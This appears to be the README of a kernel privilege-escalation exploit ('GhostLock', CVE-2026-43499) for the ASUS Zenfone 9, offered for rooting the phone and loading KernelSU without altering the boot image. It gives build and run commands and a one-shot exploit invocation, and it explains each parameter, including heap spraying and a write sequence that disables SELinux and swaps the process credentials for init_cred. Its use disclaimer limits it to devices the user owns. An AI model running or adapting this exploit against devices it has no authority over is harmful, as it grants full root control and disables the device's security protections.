# GhostLock (CVE-2026-43499) — ASUS Zenfone 9 exploit + KernelSU late-load

**English** | [繁體中文](README.zh.md)

> **Authorized research on your own device only.** Do not use on devices you
> do not own. Kernel exploits can crash or brick a device; use at your own risk.

Get root on an **ASUS Zenfone 9 (SM8475, ASUS_AI2202)**, GKI
`5.10.205-android12-9-00029-g3f12df86bfdb-ab11799032`, VA39, via
CVE-2026-43499, and finish with **KernelSU LKM late-load**.
**No boot.img / init_boot.img modification.**

---

## Quick start

```sh
# 1) Fetch KernelSU components
sh scripts/fetch-ksu.sh

# 2) Build (needs Android NDK r27+ aarch64-linux-android31-clang)
sh build.sh          # produces ./slide_dev

# 3) Run once per fresh boot; ~3-4 minutes
ADB="path/to/adb" sh run.sh

# 4) Verify
adb shell su -c id
# uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0
```

---

## Layout

```
zf9-ghostlock/
├── build.sh                 # build slide_dev
├── run.sh                   # push + launch + verify hint
├── Makefile
├── src/                     # exploit source (slide_dev)
│   ├── main.c util.c slide.c fops.c pipe.c persist.c
│   ├── prop.c cfi.c qmain.c seqoverlay.c
│   ├── common.h target.h offset.h
│   └── kernelsnitch/        # KernelSnitch (mm_struct leak)
├── scripts/fetch-ksu.sh     # download KernelSU v3.3.0 components
├── ksu/                     # ksud / kernelsu.ko / ksuinit / ksu.apk (gitignored)
├── offsets/                 # 5.10.205 offset table (see below)
├── docs/
│   ├── TUTORIAL.md          # full guide (EN)
│   └── TUTORIAL.zh.md       # full guide (ZH)
├── README.md / README.zh.md
├── CREDITS.md / CREDITS.zh.md
└── ROADMAP.md / ROADMAP.zh.md
```

---

## One-shot recipe

```sh
./slide_dev 0x28000000 persist noslide neutral sweep 64 sweepstart=25 ownprobe shortseq
```
| token | meaning |
|---|---|
| `0x28000000` | this device's delta (XBL kernel load 0xA8000000 − P0_PHYS_OFFSET 0x80000000) |
| `persist` | exploit main path |
| `noslide` / `neutral` | skip legacy walk-slide; neutralise page |
| `sweep 64` | spray candidate rounds |
| `sweepstart=25` | start at the historically sticky cell (phys 0xaccd7000) |
| `ownprobe` | pure userspace self-write probe (zero walk deaths) |
| `shortseq` | mini 3-write sequence: SELinux off → `real_cred`/`cred` = `init_cred` |

On success: `uid=0` → automatic `ksud late-load --kmi android12-5.10 --allow-shell` → KernelSU.

---

## Good to know

- **One boot, one run.** Placement and KASLR are fresh each boot; re-running in
  the same boot lands on a disturbed memory map.
- **LKM is per-boot.** KernelSU disappears after reboot; re-run `run.sh`
  (without touching boot.img you cannot auto-load at boot).
- **Never `insmod kernelsu.ko`** — it fails on ~40 unexported symbols; use
  `ksud late-load`.
- Full mechanics and troubleshooting: `docs/TUTORIAL.md`.

---

## offsets/

`offsets/` holds the offset table for this kernel for frameworks that support
multi-device offset tables / runtime JSON import:
- `offsets-5.10.205.json` — runtime JSON format (`symbols` + `struct_fields`).
- `5.10.205-offsets.h` — C header format (`STRUCT_OFFSETS_5_10` entry).

Note: the 5.10 `rt_mutex_waiter` is a **10-word flat** layout
(`tree/pi_tree/task/lock/prio/deadline`), different from 6.1/6.6; a consumer
needs a matching waiter branch (word10 = plain prio, no `ww_ctx`).

---

## License

MIT (see `LICENSE`). **Authorized security research only.**

## Credits

See `CREDITS.md` — and `ROADMAP.md` for what we tried and what finally worked.
